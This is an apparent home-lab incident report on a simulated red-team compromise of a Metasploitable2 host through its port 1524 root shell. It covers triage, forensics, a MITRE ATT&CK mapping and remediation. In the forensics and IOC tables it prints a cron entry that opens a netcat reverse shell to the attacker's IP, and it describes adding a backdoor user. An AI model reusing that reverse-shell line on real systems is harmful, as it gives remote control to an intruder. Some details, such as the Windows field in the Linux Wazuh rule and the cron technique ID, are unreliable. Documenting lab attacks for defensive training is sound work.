# Simulation 2: Metasploitable2 – Exploitation & Pivot Attempt

## 1. Executive Summary

**Date of Incident:** 2026-07-29  
**Attacker IP:** 192.168.163.164 (Kali Linux – Attacker Zone)  
**Target:** Metasploitable2 (Legacy Zone – IP 192.168.6.141)  
**Vulnerability Exploited:** Unauthenticated root shell backdoor exposed on port 1524 (intentionally left for testing)  

A Red Team operator connected directly to the root shell backdoor on port 1524 of Metasploitable2, gaining immediate root access. The attacker created a backdoor user (`attacker`), added a cron job for persistence, and left a compromise marker (`/root/compromised.txt`). All attempts to pivot to other zones (User_LAN, Server_LAN, Security_LAN) via ICMP pings failed, confirming that network segmentation controls are effective.

**Detection:** No host‑based Wazuh agent was installed on Metasploitable2, so no host‑level alerts were generated. Network‑based detection (Suricata on OPNsense) may have logged the connection, but no specific alert was triggered.  
**Investigation:** Manual forensic evidence was collected from the root shell.  
**Segmentation:** Lateral movement was blocked by OPNsense firewall rules.

---

## 2. SOC Triage

### 2.1 – Detection Status

| Source | Alert | Status |
|--------|-------|--------|
| Wazuh (host) | N/A – Agent not installed | ❌ No host alerts |
| Suricata (NIDS) | Potential connection to port 1524 | ⚠️ Not confirmed (no rule triggered) |

**Conclusion:** The attack was **not detected** at the host level. This is a critical detection gap that requires remediation (deploy agents or isolate legacy systems).

### 2.2 – Custom Rules Recommendation

If a Wazuh agent were installed, we could add a rule to detect the creation of the `attacker` user:

```xml
<group name="detect,useradd">
  <rule id="100101" level="10">
    <if_sid>550</if_sid> <!-- Rule for useradd event -->
    <field name="win.eventdata.targetUserName" type="pcre2">^attacker$</field>
    <description>Backdoor user 'attacker' created on $(win.eventdata.targetUserName).</description>
  </rule>
</group>
```

### 2.3 – Time to Detect (TTD)

- **Attack Time:** `2026-07-29 08:47` (connection to port 1524)  
- **Detection Time:** Not detected  
- **TTD:** **Undefined** (no detection)

---

## 3. DFIR Investigation (Manual Evidence Collection)

### 3.1 – Evidence Collected via Root Shell

| Artifact | Command | Result |
|----------|---------|--------|
| **Backdoor user** | `grep attacker /etc/passwd` | `attacker:x:1001:1001:,,,:/home/attacker:/bin/bash` |
| **Persistence (cron)** | `crontab -l` | `* * * * * root /bin/bash -c 'nc -e /bin/sh 192.168.163.164 4445'` |
| **Marker file** | `cat /root/compromised.txt` | `Compromised by Red Team` |
| **Network connections** | `netstat -tunp` | No active outbound connections (reverse shell not active) |

### 3.2 – Chronology

| Time | Event |
|------|-------|
| `08:46` | nmap scan of Legacy subnet (192.168.6.0/24) |
| `08:47` | Connection to root shell on port 1524 |
| `08:48` | Creation of `attacker` user |
| `08:48` | Cron job added for persistence |
| `08:49` | Marker file created |
| `08:50` | Segmentation tests performed (all failed) |

### 3.3 – Segmentation Test Results

| Source → Destination | Result | Proof |
|----------------------|--------|-------|
| Legacy (6.141) → User_LAN (8.143) | ❌ Blocked | 100% packet loss |
| Legacy (6.141) → Server_LAN (7.139) | ❌ Blocked | 100% packet loss |
| Legacy (6.141) → Security_LAN (9.133) | ❌ Blocked | 100% packet loss |

**Conclusion:** Network segmentation **held**. No lateral movement possible.

---

## 4. CTI – Threat Intelligence (MITRE ATT&CK)

### 4.1 – MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|--------|--------------|----------------|----------|
| Reconnaissance | T1595.002 | Vulnerability Scanning | nmap scan |
| Initial Access | T1190 | Exploit Public-Facing Application | Direct connection to port 1524 |
| Execution | T1059.004 | Command and Scripting Interpreter | Commands via root shell |
| Persistence | T1037.003 | Cron Job | Added cron job |
| Persistence | T1136.001 | Create Account: Local Account | `useradd attacker` |
| Command & Control | T1071.001 | Web Protocols | Planned reverse shell (not yet active) |
| Lateral Movement | T1021.002 | Remote Services | Attempted ping to other zones (failed) |

### 4.2 – Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| Source IP | `192.168.163.164` |
| Target IP | `192.168.6.141` |
| Backdoor Port | `1524` |
| Backdoor User | `attacker` |
| Cron Job | `* * * * * root /bin/bash -c 'nc -e /bin/sh 192.168.163.164 4445'` |
| Marker File | `/root/compromised.txt` |

### 4.3 – Executive Summary (Mandiant‑style)

> On 29 July 2026, an attacker exploited the unauthenticated root shell backdoor on port 1524 of the Metasploitable2 host (192.168.6.141). Root access was obtained instantly. The attacker created a local user account (`attacker`), added a cron‑based persistence mechanism, and left a compromise marker. All attempts to pivot to other internal networks (User_LAN, Server_LAN, Security_LAN) failed due to effective network segmentation. No host‑based detection was available, and the attack remained undetected.

---

## 5. GRC – Compliance & Risk Assessment (NIST CSF 2.0)

### 5.1 – NIST CSF 2.0 Mapping

| Function | Category | Subcategory | Observation | Status |
|----------|----------|-------------|-------------|--------|
| **Govern** | GV.OC | GV.OC‑05: Cybersecurity policy is established | Legacy system lacks monitoring | 🔴 Gap |
| **Identify** | ID.RA | ID.RA‑01: Vulnerabilities are identified | Metasploitable2 intentionally vulnerable | 🔴 Gap |
| **Protect** | PR.PS | PR.PS‑04: Software is maintained | Outdated, vulnerable OS | 🔴 Gap |
| **Protect** | PR.AT | PR.AT‑01: Personnel are aware of risks | Legacy system not isolated from critical zones? | 🟡 Partial |
| **Detect** | DE.CM | DE.CM‑03: Network activity is monitored | No agent; Suricata may log but not alert | 🟡 Partial |
| **Respond** | RS.AN | RS.AN‑04: Impact is estimated | No detection, no response | 🔴 Gap |
| **Recover** | RC.RP | RC.RP‑01: Recovery plan is executed | Not applicable (baseline phase) | ⏳ Pending |

### 5.2 – Segmentation Assessment

**All cross‑zone pings failed**, confirming that OPNsense firewall rules correctly block traffic from Legacy to other internal zones. The segmentation control is fully effective.

### 5.3 – Remediation Plan

| Priority | Action | Owner |
|----------|--------|-------|
| **High** | Deploy Wazuh agent on all legacy systems or isolate them completely | Security Team |
| **High** | Remove or disable unnecessary backdoor services (port 1524) | System Admin |
| **High** | Implement network‑based detection rules for outbound connections from Legacy | Network Team |
| **Medium** | Schedule periodic vulnerability scans of Legacy zone | Security Team |
| **Medium** | Document and enforce least‑privilege access for legacy systems | GRC Team |

---

## 6. Phase B – Improvement Roadmap

### 6.1 – SOC (Wazuh)

| Improvement | Description |
|-------------|-------------|
| **Deploy Agents** | Install Wazuh agents on all Legacy systems for host‑based detection. |
| **Custom Rules** | Add rules for user creation (`useradd`) and cron job modifications. |
| **Suricata Rules** | Create Suricata rules to detect connections to known backdoor ports (1524, 6200, etc.). |

### 6.2 – DFIR (Velociraptor)

| Improvement | Description |
|-------------|-------------|
| **Agent Deployment** | Deploy Velociraptor agents on Legacy systems to enable VQL investigations. |
| **Hunt for Backdoors** | Create a hunt for SUID binaries and open ports on Legacy systems. |

### 6.3 – CTI (MISP)

| Improvement | Description |
|-------------|-------------|
| **MISP Event** | Create a MISP event for the exploited backdoor (port 1524) and related IOCs. |
| **IOC Sharing** | Share IOCs (attacker IP, port, filenames) with other analysts. |

### 6.4 – GRC (Privilege & Segmentation)

| Improvement | Description |
|-------------|-------------|
| **Isolation** | Isolate Legacy systems in a dedicated network with strict egress filtering. |
| **Remediation** | Retire or patch outdated systems (Metasploitable2 is intentionally vulnerable – use for testing only). |
| **Monitoring** | Enable logging for all inbound/outbound connections to Legacy zone. |

### 6.5 – Automation (Shuffle / SOAR)

| Improvement | Description |
|-------------|-------------|
| **Alerting** | Automate alerts when connections to backdoor ports are detected by Suricata. |
| **Isolation** | Use Shuffle to automatically block the attacker IP in OPNsense upon detection. |

---

## 7. Screenshots

| Step | Screenshot |
|------|------------|
| nmap scan of Legacy subnet | ✅ `Capture d'écran 2026-07-29 154635.png` |
| nmap detailed scan | ✅ `Capture d'écran 2026-07-29 155354.png` & `155343.png` |
| Root shell on port 1524 | ✅ `Capture d'écran 2026-07-29 154548.png` |
| Failed pings to 8.143, 7.139, 9.133 | ✅ `Capture d'écran 2026-07-29 154548.png` |

---

## 8. Conclusion

The Legacy zone host (Metasploitable2) was successfully compromised via the port 1524 root shell backdoor. The attacker established persistence and attempted to pivot to other internal networks, but **all attempts were blocked** by OPNsense segmentation. The attack was **not detected** at the host level due to the absence of a Wazuh agent. This highlights a critical detection gap that must be addressed.

**Key Takeaways:**
- **Segmentation works** – No lateral movement possible.
- **Detection gap** – Legacy systems must be monitored or isolated.
- **Hardening needed** – Remove unnecessary backdoor services.

**Next Steps:**
- Deploy Wazuh agents to all legacy systems.
- Implement Suricata rules to alert on backdoor connections.
- Schedule periodic vulnerability scans.

---
*Report Generated by SOC Analyst & DFIR Investigator – Phase A Baseline Assessment*
